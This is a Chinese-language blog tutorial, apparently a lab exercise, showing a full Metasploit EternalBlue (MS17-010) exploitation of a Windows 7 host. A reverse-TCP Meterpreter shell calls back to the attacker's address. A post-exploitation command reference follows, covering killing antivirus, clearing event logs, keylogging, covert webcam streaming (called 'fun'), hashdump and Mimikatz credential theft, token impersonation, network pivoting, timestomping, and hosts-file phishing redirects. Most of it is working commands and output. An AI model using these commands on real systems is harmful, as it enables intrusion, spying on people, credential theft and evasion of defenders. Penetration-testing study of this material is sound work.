class="string">   RPORT        445                                                             yes       The SMB service port (TCP)</span></span><br><span class="line"><span class="string">   SMBDomain    .                                                               no        The Windows domain to use for authentication</span></span><br><span class="line"><span class="string">   SMBPass                                                                      no        The password for the specified username</span></span><br><span class="line"><span class="string">   SMBUser                                                                      no        The username to authenticate as</span></span><br><span class="line"><span class="string">   THREADS      1                                                               yes       The number of concurrent threads (max one per host)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span></span><br><span class="line"><span class="string">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="string">payload =&gt; windows/x64/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="string">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Module options (exploit/windows/smb/ms17_010_eternalblue):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name           Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----           ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line"><span class="string">   RPORT          445              yes       The target port (TCP)</span></span><br><span class="line"><span class="string">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span></span><br><span class="line"><span class="string">   SMBPass                         no        (Optional) The password for the specified username</span></span><br><span class="line"><span class="string">   SMBUser                         no        (Optional) The username to authenticate as</span></span><br><span class="line"><span class="string">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span></span><br><span class="line"><span class="string">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload options (windows/x64/meterpreter/reverse_tcp):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name      Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----      ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span></span><br><span class="line"><span class="string">   LHOST                      yes       The listen address (an interface may be specified)</span></span><br><span class="line"><span class="string">   LPORT     4444             yes       The listen port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Exploit target:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Id  Name</span></span><br><span class="line"><span class="string">   --  ----</span></span><br><span class="line"><span class="string">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.11.131</span></span><br><span class="line"><span class="string">rhosts =&gt; 192.168.11.131</span></span><br><span class="line"><span class="string">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 192.168.11.150</span></span><br><span class="line"><span class="string">lhost =&gt; 192.168.11.150</span></span><br><span class="line"><span class="string">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.11.150:4444</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span></span><br><span class="line"><span class="string">[+] 192.168.11.131:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445    - Scanned 1 of 1 hosts (100% complete)</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - Connecting to target for exploitation.</span></span><br><span class="line"><span class="string">[+] 192.168.11.131:445 - Connection established for exploitation.</span></span><br><span class="line"><span class="string">[+] 192.168.11.131:445 - Target OS selected valid for OS indicated by SMB reply</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - CORE raw buffer dump (38 bytes)</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1</span></span><br><span class="line"><span class="string">[+] 192.168.11.131:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - Trying exploit with 12 Groom Allocations.</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - Sending all but last fragment of exploit packet</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - Starting non-paged pool grooming</span></span><br><span class="line"><span class="string">[+] 192.168.11.131:445 - Sending SMBv2 buffers</span></span><br><span class="line"><span class="string">[+] 192.168.11.131:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - Sending final SMBv2 buffers.</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - Sending last fragment of exploit packet!</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - Receiving response from exploit packet</span></span><br><span class="line"><span class="string">[+] 192.168.11.131:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - Sending egg to corrupted connection.</span></span><br><span class="line"><span class="string">[*] 192.168.11.131:445 - Triggering free of corrupted buffer.</span></span><br><span class="line"><span class="string">[*] Sending stage (201283 bytes) to 192.168.11.131</span></span><br><span class="line"><span class="string">[*] Meterpreter session 1 opened (192.168.11.150:4444 -&gt; 192.168.11.131:49166) at 2020-07-22 07:20:04 -0400</span></span><br><span class="line"><span class="string">[+] 192.168.11.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span></span><br><span class="line"><span class="string">[+] 192.168.11.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span></span><br><span class="line"><span class="string">[+] 192.168.11.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span></span><br><span class="line"><span class="string">meterpreter &gt;</span></span><br></pre></td></tr></table></figure>

<p>getshell 之后就进入了 meterpreter</p>
<blockquote>
<p>meterpreter 是 metasploit 框架中的一个扩展模块，作为溢出成功后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个 meterpreter shell 的链接。</p>
</blockquote>
<p>meterpreter shell 作为渗透模块有很多有用的功能，比如：添加一个用户、隐藏一些东西、打开 shell、得到用户密码、上传下载远程主机的文件、运行 cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和 IP 地址等信息。另外 meterpreter 能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此 HIDS（基于主机的入侵检测系统) 很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。<br>若 getshell 之后没有进入 meterpreter：<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cee0c3948662">https://www.jianshu.com/p/cee0c3948662</a><br>或者使用：sessions -u sessionI（升级一个普通的 Windows shell 到 metasploit shell）</p>
<h1 id="meterpreter-的简单使用"><a href="#meterpreter-的简单使用" class="headerlink" title="meterpreter 的简单使用"></a>meterpreter 的简单使用</h1><h2 id="1、开启-Windows-靶机-system-权限的命令行"><a href="#1、开启-Windows-靶机-system-权限的命令行" class="headerlink" title="1、开启 Windows 靶机 system 权限的命令行"></a>1、开启 Windows 靶机 system 权限的命令行</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595417439244-6cd0d1aa-e39e-4850-9b25-d5a529d1bf3f.png#align=left&display=inline&height=185&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722193033.png&originHeight=185&originWidth=550&size=29960&status=done&style=none&width=550" alt="TIM截图20200722193033.png"></p>
<blockquote>
<p>退出 cmd 的方法：输入 exit，回车</p>
</blockquote>
<h2 id="2、对靶机进行截图监控"><a href="#2、对靶机进行截图监控" class="headerlink" title="2、对靶机进行截图监控"></a>2、对靶机进行截图监控</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595417587787-0dde805e-4e1c-4f15-9c77-7ab9085063d8.png#align=left&display=inline&height=96&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722193301.png&originHeight=96&originWidth=442&size=12687&status=done&style=none&width=442" alt="TIM截图20200722193301.png"><br>截图保存在了桌面上<br>Windows 端：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595417792385-0cad16cd-68dd-4f7d-9c64-26604d7aaeba.png#align=left&display=inline&height=839&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722193405.png&originHeight=839&originWidth=1920&size=833933&status=done&style=none&width=1920" alt="TIM截图20200722193405.png"><br>kali 端截图：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595417804395-4ff84ea2-1ae2-4107-85ad-94cfc2da0df0.png#align=left&display=inline&height=887&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722193439.png&originHeight=887&originWidth=1920&size=657893&status=done&style=none&width=1920" alt="TIM截图20200722193439.png"></p>
<h2 id="3、获取按键信息："><a href="#3、获取按键信息：" class="headerlink" title="3、获取按键信息："></a>3、获取按键信息：</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595417969607-cfcd7df8-e0c4-4718-a039-9e04321b0093.png#align=left&display=inline&height=149&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722193921.png&originHeight=149&originWidth=306&size=15404&status=done&style=none&width=306" alt="TIM截图20200722193921.png"><br>开始获取：keyscan_start<br>下载内容：keyscan_dump<br>停止获取：keyscan_stop</p>
<blockquote>
<p>没有获取到，应该需要在捕获的同时需要进行键盘操作</p>
</blockquote>
<h2 id="4、清除事件日志"><a href="#4、清除事件日志" class="headerlink" title="4、清除事件日志"></a>4、清除事件日志</h2><p>执行“clearev”命令，将清除事件日志。</p>
<h1 id="附：常用的命令"><a href="#附：常用的命令" class="headerlink" title="附：常用的命令"></a>附：常用的命令</h1><p>文章来自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41880069/article/details/82908293">https://blog.csdn.net/qq_41880069/article/details/82908293</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangyuyang1016/p/11032201.html#raligun%E7%BB%84%E4%BB%B6%E6%93%8D%E4%BD%9Cwindowsapi">https://www.cnblogs.com/wangyuyang1016/p/11032201.html</a><br>以下所有操作均是在 meterpreter 模块下，获取目标主机的 meterpreter shell 为所有操作的前提<br>攻陷目标操作系统系统后就可以进入 Meterpreter 会话<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1512305/201906/1512305-20190616171930604-417617785.png"><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595419156156-c4e8114f-5c52-4fe3-b6af-b2b6b735bdb6.png#align=left&display=inline&height=518&margin=%5Bobject%20Object%5D&originHeight=518&originWidth=827&size=0&status=done&style=none&width=827"></a></p>
<blockquote>
</blockquote>
<h2 id="一：进程迁移"><a href="#一：进程迁移" class="headerlink" title="一：进程迁移"></a>一：进程迁移</h2><p>进程迁移的原因与目的：在刚拿到 meterpreter shell 时，该 shell 是极其脆弱的，通过进程迁移，把该 shell 和一个稳定的进程绑定在一起，防止被检测到查杀。</p>
<h3 id="1：获取目标主机正在运行的进程"><a href="#1：获取目标主机正在运行的进程" class="headerlink" title="1：获取目标主机正在运行的进程"></a>1：获取目标主机正在运行的进程</h3><p>指令：ps<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595419181813-c7f3bf80-c463-4abd-91ad-d0782902de74.png#align=left&display=inline&height=688&margin=%5Bobject%20Object%5D&originHeight=688&originWidth=1158&size=0&status=done&style=none&width=1158"></p>
<h3 id="2：查看-meterpreter-shell-的进程号"><a href="#2：查看-meterpreter-shell-的进程号" class="headerlink" title="2：查看 meterpreter shell 的进程号"></a>2：查看 meterpreter shell 的进程号</h3><p>指令：getpid</p>
<h3 id="3：进程迁移-（先找一个稳定的已打开的的应用进程）"><a href="#3：进程迁移-（先找一个稳定的已打开的的应用进程）" class="headerlink" title="3：进程迁移 （先找一个稳定的已打开的的应用进程）"></a>3：进程迁移 （先找一个稳定的已打开的的应用进程）</h3><p>指令：migrate &lt;稳定的进程号&gt;<br>此时再次使用 ps 指令，会发现原来的 meterpreter shell 的进程号没了，即该 shell 已经被绑定在计划中的稳定进程上了</p>
<h3 id="4：自动进行进程迁移-（系统会自动寻找合适的进程进行迁移）"><a href="#4：自动进行进程迁移-（系统会自动寻找合适的进程进行迁移）" class="headerlink" title="4：自动进行进程迁移 （系统会自动寻找合适的进程进行迁移）"></a>4：自动进行进程迁移 （系统会自动寻找合适的进程进行迁移）</h3><p>指令：run post/windows/manage/migrate<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418198924-3f7da1f4-a323-41df-9e0b-793a38ec2935.png#align=left&display=inline&height=375&margin=%5Bobject%20Object%5D&originHeight=375&originWidth=822&size=0&status=done&style=none&width=822"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418202912-0236bab8-87e1-474d-9c62-0926c700fb4e.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&originHeight=134&originWidth=810&size=0&status=done&style=none&width=810"></p>
<h2 id="二：系统命令"><a href="#二：系统命令" class="headerlink" title="二：系统命令"></a>二：系统命令</h2><h3 id="1：查看系统信息"><a href="#1：查看系统信息" class="headerlink" title="1：查看系统信息"></a>1：查看系统信息</h3><p>指令：sysinfo<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595419133262-6673d655-2850-4097-b0fa-a8dffce6f437.png#align=left&display=inline&height=124&margin=%5Bobject%20Object%5D&originHeight=124&originWidth=519&size=0&status=done&style=none&width=519"></p>
<h3 id="2：查看目标主机运行时间"><a href="#2：查看目标主机运行时间" class="headerlink" title="2：查看目标主机运行时间"></a>2：查看目标主机运行时间</h3><p>指令：idletime</p>
<h3 id="3：查看目标机是否运行在虚拟机上"><a href="#3：查看目标机是否运行在虚拟机上" class="headerlink" title="3：查看目标机是否运行在虚拟机上"></a>3：查看目标机是否运行在虚拟机上</h3><p>指令：run post/windows/gather/checkvm</p>
<h3 id="4：查看当前主机用户名及其权限"><a href="#4：查看当前主机用户名及其权限" class="headerlink" title="4：查看当前主机用户名及其权限"></a>4：查看当前主机用户名及其权限</h3><p>指令：getuid</p>
<h3 id="5：关闭杀毒软件"><a href="#5：关闭杀毒软件" class="headerlink" title="5：关闭杀毒软件"></a>5：关闭杀毒软件</h3><p>指令：run post/windows/manage/killav</p>
<h3 id="6：启动目标主机的-3389-端口即远程桌面协议"><a href="#6：启动目标主机的-3389-端口即远程桌面协议" class="headerlink" title="6：启动目标主机的 3389 端口即远程桌面协议"></a>6：启动目标主机的 3389 端口即远程桌面协议</h3><p>① 指令：run post/windows/manage/enable_rdp<br>② 指令：run getgui -e<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418209658-99024fbb-091f-4867-80a7-d49181941381.png#align=left&display=inline&height=695&margin=%5Bobject%20Object%5D&originHeight=695&originWidth=814&size=0&status=done&style=none&width=814"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418215828-764c4499-5fd9-4c51-8081-899c62a24647.png#align=left&display=inline&height=695&margin=%5Bobject%20Object%5D&originHeight=695&originWidth=814&size=0&status=done&style=none&width=814"></p>
<h3 id="7：将当前会话放到后台"><a href="#7：将当前会话放到后台" class="headerlink" title="7：将当前会话放到后台"></a>7：将当前会话放到后台</h3><p>指令：background</p>
<h3 id="8：端口转发"><a href="#8：端口转发" class="headerlink" title="8：端口转发"></a>8：端口转发</h3><p>指令：portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的 3389 端口转发到本地 6666 端口<br>指令：run getgui -f 6661 –e<br>实现效果如图：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418221945-ec8e97d6-44dc-47ac-a3ab-34acade7cec4.png#align=left&display=inline&height=503&margin=%5Bobject%20Object%5D&originHeight=503&originWidth=1534&size=0&status=done&style=none&width=1534"></p>
<h3 id="9：路由-route-操作"><a href="#9：路由-route-操作" class="headerlink" title="9：路由 route 操作"></a>9：路由 route 操作</h3><p>①：查看已拿下的目标主机的内网 IP 段情况<br>指令：run get_local_subnets<br>②：添加路由（先使用 background 将 meterpreter 终端放到后台）<br>指令 1：</p>
<ul>
<li>route add &lt;要添加的路由&gt; 例：route add 192.168.111.0</li>
<li>route print （查看已添加的路由）</li>
</ul>
<p>指令 2：</p>
<ul>
<li>run autoroute -s 192.168.159.0/24 #添加到目标环境网络</li>
<li>run autoroute –p #查看添加的路由</li>
</ul>
<p>当目的路由被成功添加到已攻陷主机的路由表中，就可以借助被攻陷的主机对其他网络进行攻击了。<br>添加路由后可以进行以被攻陷主机的 ip 扫描该网段下的其他主机</p>
<ul>
<li>run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24</li>
<li>run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=338</li>
<li>route print：显示当前活跃的路由设置，查看路由是否添加成功</li>
</ul>
<h3 id="10：关闭杀毒软件"><a href="#10：关闭杀毒软件" class="headerlink" title="10：关闭杀毒软件"></a>10：关闭杀毒软件</h3><p>命令：run killav</p>
<h3 id="11：列举当前目标机有多少用户登录"><a href="#11：列举当前目标机有多少用户登录" class="headerlink" title="11：列举当前目标机有多少用户登录"></a>11：列举当前目标机有多少用户登录</h3><p>命令：run post/windows/gather/enum_logged_on_users<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418228167-41638f94-cea9-4571-a6f9-98f0d9d3f888.png#align=left&display=inline&height=461&margin=%5Bobject%20Object%5D&originHeight=461&originWidth=956&size=0&status=done&style=none&width=956"></p>
<h3 id="12：添加用户"><a href="#12：添加用户" class="headerlink" title="12：添加用户"></a>12：添加用户</h3><p>①：run post/windows/manage/enable_rdp USERNAME=<strong>* PASSWORD=****</strong><br>②：run getgui -u example_username -p example_password</p>
<h3 id="13：抓取目标机的屏幕截图"><a href="#13：抓取目标机的屏幕截图" class="headerlink" title="13：抓取目标机的屏幕截图"></a>13：抓取目标机的屏幕截图</h3><p>命令：<br>①：先输入 load espia 加载插件 再输 screengrab，会保存截图在 root 目 录下<br>②：输入 screenshot 效果同上<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418234562-55c041d4-a850-4094-9938-15d2a3425123.png#align=left&display=inline&height=185&margin=%5Bobject%20Object%5D&originHeight=185&originWidth=436&size=0&status=done&style=none&width=436"><br>截取的图片<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/574026/1595418238134-8c20a9a8-49ae-4bc8-b7b0-1da3030c0c9e.jpeg#align=left&display=inline&height=889&margin=%5Bobject%20Object%5D&originHeight=889&originWidth=1666&size=0&status=done&style=none&width=1666"></p>
<h3 id="14：webcam-摄像头命令"><a href="#14：webcam-摄像头命令" class="headerlink" title="14：webcam 摄像头命令"></a>14：webcam 摄像头命令</h3><p>①：查看目标机是否有摄像头：webcam_list<br>②：打开目标主机的摄像头拍一张照片：webcam_snap<br>③：打开目标主机的摄像头抓取视频（即直播）<br>指令：webcam_stream<br>该指令会返回一个 url，在浏览器打开该地址即可观看</p>
<p>大家可以试一下这个命令，很好玩哟</p>
<h3 id="15：进入目标机-shell，获取目标主机的远程命令行"><a href="#15：进入目标机-shell，获取目标主机的远程命令行" class="headerlink" title="15：进入目标机 shell，获取目标主机的远程命令行"></a>15：进入目标机 shell，获取目标主机的远程命令行</h3><p>（如果出错，考虑是目标主机限制了 cmd.exe 的访问权，可以使用 migrate 注入到管理员用户进程中再尝试）<br>指令为：shell 结束指令为：exit</p>
<h2 id="三：文件系统命令"><a href="#三：文件系统命令" class="headerlink" title="三：文件系统命令"></a>三：文件系统命令</h2><p>常用指令如下<br>这些命令比较简单，但却很重要，就不截图详细说明了</p>
<ul>
<li>getwd 或者 pwd # 查看当前工作目录</li>
<li>ls #显示当前目录下的内容</li>
<li>cd #切换目录</li>
<li>search -f *.txt -d c:\ # 搜索文件 -f 指定文件类型，-d 指定在哪个目录下搜索</li>
<li>cat c:\test\testpasswd.txt # 查看文件内容</li>
<li>upload /tmp/hack.txt C:\test # 上传 hack.txt 文件到目标机 C 盘 test 目录下</li>
<li>download c:\test.txt/root # 下载目标主机 test.txt 文件到本机 root 目录下</li>
<li>edit c:\1.txt #编辑或创建文件 没有的话，会新建文件</li>
<li>rm C:\lltest\hack.txt</li>
<li>mkdir lltest2 #只能在当前目录下创建文件夹</li>
<li>rmdir lltest2 #只能删除当前目录下文件夹</li>
<li>getlwd 或者 lpwd #操作攻击者主机 查看当前目录</li>
<li>lcd /tmp #操作攻击者主机 切换目录</li>
</ul>
<h2 id="四：其他常用命令"><a href="#四：其他常用命令" class="headerlink" title="四：其他常用命令"></a>四：其他常用命令</h2><h3 id="1：session-命令"><a href="#1：session-命令" class="headerlink" title="1：session 命令"></a>1：session 命令</h3><p>session 命令可以查看已经成功获取的会话<br>可以使用 session -i 连接到指定序号的 meterpreter 会话已继续利用</p>
<h3 id="2：timestomp-伪造时间戳"><a href="#2：timestomp-伪造时间戳" class="headerlink" title="2：timestomp 伪造时间戳"></a>2：timestomp 伪造时间戳</h3><p>时间戳的解释<a target="_blank" rel="noopener" href="http://blog.csdn.net/qq_41651465/article/details/80005362">http://blog.csdn.net/qq_41651465/article/details/80005362</a><br>timestomp C:// -h #查看帮助<br>timestomp -v C://2.txt #查看时间戳<br>timestomp C://2.txt -f C://1.txt #将 1.txt 的时间戳复制给 2.txt</p>
<h3 id="3：键盘记录器功能-keyscan"><a href="#3：键盘记录器功能-keyscan" class="headerlink" title="3：键盘记录器功能 keyscan"></a>3：键盘记录器功能 keyscan</h3><p>命令：<br>keyscan_start 开启记录目标主机的键盘输入<br>keyscan_dump 输出截获到的目标键盘输入字符信息<br>keyscan_stop 停止键盘记录</p>
<h3 id="4：系统账号密码获取"><a href="#4：系统账号密码获取" class="headerlink" title="4：系统账号密码获取"></a>4：系统账号密码获取</h3><blockquote>
<p>Windows 系统存储哈希值的方式一般是 LM、NTLM 或者 NTLMv2。<br>在明文密码输入后系统会将密码转为哈希值；由于哈希值的长度限制，将密码切分为 7 个字符一组的哈希值；<br>以 password123456 密码为例，哈希值会以 【{passwor}{d123456}】每个花括号是一组哈希值共两组，所以攻击者只要破解 7 个字符一组的密码，而不是原始的 14 个字符，而 NTLM 存储方式和密码长度无关，密码将作为整体哈希值存储。</p>
</blockquote>
<p>①：命令：hashdump<br>在拿到 system 权限下，使用该命令，可以查看系统账号密码的 hash 值，在 cmd5 在线破解网站可以尝试破解，或者采用后面的 Mimikatz 模块尝试爆破<br>②：使用 hashdump 脚本<br>命令：run hashdump<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418257587-089e4c08-1d75-4baf-a5b6-ee0c424fed7e.png#align=left&display=inline&height=511&margin=%5Bobject%20Object%5D&originHeight=511&originWidth=1047&size=0&status=done&style=none&width=1047"><br>post/windows/gether/hashdump 模块：获取系统所有的用户名和密码哈希值<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595419439108-4170f380-ac75-43b0-a637-18edc313d1f1.png#align=left&display=inline&height=300&margin=%5Bobject%20Object%5D&originHeight=300&originWidth=755&size=0&status=done&style=none&width=755"><br>获取安全账户的账号管理器 SAM 数据库，我们需要运行在 System 权限下（use priv），以求绕过注册表的限制，获得受保护的用户和密码的 SAM 存储。</p>
<blockquote>
<p>use priv 命令：意味着运行在特权账号上</p>
</blockquote>
<p>哈希值解析：</p>
<blockquote>
<p>以 aad3b435 开头的哈希值是一个空的或不存在的哈希值（空字串的占位符）。</p>
</blockquote>
<p>传递哈希值：</p>
<blockquote>
<p>用哈希值传递技术，用 psexec 模块就可以实现，</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595419577155-3bee9e1d-1dd7-4861-8831-bec688732da6.png#align=left&display=inline&height=498&margin=%5Bobject%20Object%5D&originHeight=498&originWidth=1347&size=0&status=done&style=none&width=1347"></p>
<h3 id="5：edit-命令"><a href="#5：edit-命令" class="headerlink" title="5：edit 命令"></a>5：edit 命令</h3><p>调用 vi 编辑器，对目标主机上的文件修改<br>例如修改目标主机上的 hosts 文件，使得目标主机访问 baidu 时去到准备好的钓鱼网站</p>
<h3 id="6：execute-命令"><a href="#6：execute-命令" class="headerlink" title="6：execute 命令"></a>6：execute 命令</h3><p>在目标主机上运行某个程序 结合参数-H 使用可以隐藏在后台打开程序<br>例：命令：execute -H -i -f cmd.exe 相当于获取 shell，使用 shell</p>
<h3 id="7：信息收集"><a href="#7：信息收集" class="headerlink" title="7：信息收集"></a>7：信息收集</h3><p>run post/windows/gather/enum_applications：获取目标主机上的软件安装信息<br>run post/windows/gather/dumplinks：目标主机上最近访问过的文档和链接信息<br>查看目标主机是否为虚拟机<br>run post/windows/gather/checkvm #是否虚拟机<br>run post/linux/gather/checkvm #是否虚拟机</p>
<h3 id="8：权限提升"><a href="#8：权限提升" class="headerlink" title="8：权限提升"></a>8：权限提升</h3><p>先输入 getuid 查看已获得的权限<br>尝试使用 getsystem 提权（倘若失败，只能使用内核漏洞提权）</p>
<h3 id="9：漏洞提权："><a href="#9：漏洞提权：" class="headerlink" title="9：漏洞提权："></a>9：漏洞提权：</h3><p>①：使用命令：getsystem 提权<br>②：使用其他漏洞攻击提权，如 ms16-32<br>注意：在使用其他漏洞为当前会话提权时，攻击参数要设置好 session 为当前对话的 session，这样就能使用其他漏洞为当前会话提权了</p>
<h3 id="10：-抓取密码"><a href="#10：-抓取密码" class="headerlink" title="10： 抓取密码"></a>10： 抓取密码</h3><p>常见的在 system 权限下使用命令 hashdump 可以查看目标主机的用户和其对应的密码，其他抓取密码方法如下：<br>1：使用 Qarks PwDump 抓取密码，适用于 Windows<br>2：使用 Windows Credentials Editor 抓取密码，适用于 Windows<br>3：使用 Mimikatz 抓取密码，metasploit 集成（只能在管理员权限下使用）<br>①：load mimikatz （加载该模块）<br>②：msv 抓取系统的 hash 值<br>③：mimikatz_command -f samdump:: 抓取 Hash<br>④：mimikatz_command -f service:: 查看服务<br>输入 help mimikatz，可以查看所有 mimikatz 在 metasploit 里集成的命令，即可直接使用的命令<br>例：用 msv 命令可以抓取系统的 Hash 值，用 wdigest 命令可以获取系统账户信息<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418291756-b02a1c92-4bbb-4f6b-a944-dada3ed775dc.png#align=left&display=inline&height=541&margin=%5Bobject%20Object%5D&originHeight=541&originWidth=816&size=0&status=done&style=none&width=816"><br>使用 mimikatz_command -f 加载一个不存在的模块，会显示所有 mimikatz 模块<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418297254-fc45bf78-2c89-4180-8d4d-48a2db4c7d96.png#align=left&display=inline&height=432&margin=%5Bobject%20Object%5D&originHeight=432&originWidth=494&size=0&status=done&style=none&width=494"><br>使用模块时在模块后面跟 :: 设置参数，当后面参数为空时，显示可用参数<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418314332-7f62575a-b551-4889-9a54-150308c5af05.png#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&originHeight=371&originWidth=815&size=0&status=done&style=none&width=815"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418310215-450f95e9-707b-40e0-a40d-6b3f9293f90c.png#align=left&display=inline&height=272&margin=%5Bobject%20Object%5D&originHeight=272&originWidth=800&size=0&status=done&style=none&width=800"></p>
<h3 id="11：令牌欺骗"><a href="#11：令牌欺骗" class="headerlink" title="11：令牌欺骗"></a>11：令牌欺骗</h3><p>注：令牌是交互会话中的唯一身份标识符，假冒令牌的目的就是取得的令牌对应的身份的权限<br>1&gt;：先输入 use incognito<br>2&gt;：再输入 list_tokens -u 作用：列出所有可用的 token</p>
<blockquote>
<p>注：令牌分为：① 授权令牌 Delegation Tokens 支持交互式登陆 ② 模拟令牌 impersonation Tokens 非交互式令牌）<br>3&gt;：再输入 impersonate_token 上面获取的授权令牌（注：获取的令牌 Hostname\Username 应将中间的 \ 改为 \ \</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595418313732-31983af9-73e3-43ca-98fb-21c73fb771db.png#align=left&display=inline&height=372&margin=%5Bobject%20Object%5D&originHeight=372&originWidth=673&size=0&status=done&style=none&width=673"></p>
